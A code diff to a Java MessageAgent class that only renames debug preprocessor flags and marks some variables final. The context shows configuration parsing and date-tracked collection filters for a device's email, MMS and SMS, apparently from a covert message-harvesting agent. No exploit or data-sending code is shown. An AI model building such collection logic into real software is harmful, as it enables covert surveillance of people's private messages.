@@ -137,7 +137,7 @@ public final class MessageAgent extends Agent {
         // se non corrisponde, restart dell'agente.
 
         if (firstRun) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("First Run");
             //#endif
             firstRun = false;
@@ -146,7 +146,7 @@ public final class MessageAgent extends Agent {
         }
 
         if (haveNewAccount()) {
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Restarting MessageAgent, new account");
             //#endif
             AgentManager.getInstance().reStart(agentId);
@@ -201,7 +201,7 @@ public final class MessageAgent extends Agent {
             log.close();
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("log created");
         //#endif
     }
@@ -235,7 +235,7 @@ public final class MessageAgent extends Agent {
                 // IDENTIFICATION TAG
                 identification = WChar.getString(conf, token.payloadStart,
                         token.length, false);
-                //#ifdef DEBUG_TRACE
+                //#ifdef DEBUG
                 debug.trace("Type 1: " + identification);
                 //#endif
                 break;
@@ -247,27 +247,27 @@ public final class MessageAgent extends Agent {
                     if (filter.isValid()) {
                         switch (filter.classtype) {
                         case Filter.CLASS_EMAIL:
-                            //#ifdef DEBUG_INFO
+                            //#ifdef DEBUG
                             debug.info(filter.toString());
                             //#endif
 
                             if (filter.type == Filter.TYPE_COLLECT) {
-                                //#ifdef DEBUG_TRACE
+                                //#ifdef DEBUG
                                 debug.trace("Filter.TYPE_COLLECT!");
                                 //#endif
 
-                                Date oldfrom = lastcheckGet("FilterFROM");
-                                Date oldto = lastcheckGet("FilterTO");
+                                final Date oldfrom = lastcheckGet("FilterFROM");
+                                final Date oldto = lastcheckGet("FilterTO");
 
                                 if (filter.fromDate.getTime() == oldfrom
                                         .getTime()
                                         && filter.toDate.getTime() == oldto
                                                 .getTime()) {
-                                    //#ifdef DEBUG_INFO
+                                    //#ifdef DEBUG
                                     debug.info("same Mail Collect Filter");
                                     //#endif
                                 } else {
-                                    //#ifdef DEBUG_WARN
+                                    //#ifdef DEBUG
                                     debug
                                             .warn("Changed collect filter, resetting markup");
                                     debug.trace("oldfrom: " + oldfrom);
@@ -280,20 +280,20 @@ public final class MessageAgent extends Agent {
 
                             }
 
-                            //#ifdef DEBUG_TRACE
+                            //#ifdef DEBUG
                             debug.trace("put: " + filter.type);
                             //#endif
                             filtersEMAIL.put(filter.type, filter);
 
                             break;
                         case Filter.CLASS_MMS:
-                            //#ifdef DEBUG_INFO
+                            //#ifdef DEBUG
                             debug.info(filter.toString());
                             //#endif
                             filtersMMS.put(filter.type, filter);
                             break;
                         case Filter.CLASS_SMS:
-                            //#ifdef DEBUG_INFO                            
+                            //#ifdef DEBUG                            
                             debug.info(filter.toString());
                             //#endif
                             filtersSMS.put(filter.type, filter);
@@ -307,7 +307,7 @@ public final class MessageAgent extends Agent {
                             break;
                         }
                     }
-                    //#ifdef DEBUG_TRACE
+                    //#ifdef DEBUG
                     debug.trace("Type 2: header valid: " + filter.isValid());
                     //#endif
                 } catch (final Exception e) {
@@ -348,11 +348,11 @@ public final class MessageAgent extends Agent {
     }
 
     public synchronized void lastcheckSet(String key, Date date) {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Writing markup: " + key + " date: " + date);
         //#endif
 
-        MessageAgent agent = MessageAgent.getInstance();
+        final MessageAgent agent = MessageAgent.getInstance();
 
         if (agent != null) {
             agent.markupDate.put(key, date);
@@ -370,7 +370,7 @@ public final class MessageAgent extends Agent {
 
         Date date = markupDate.get(key);
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("getLastCheck: " + key + " = " + date);
         //#endif
 
@@ -382,7 +382,7 @@ public final class MessageAgent extends Agent {
     }
 
     public synchronized void lastcheckReset() {
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("lastcheckReset markupDate: " + markupDate);
         //#endif
 
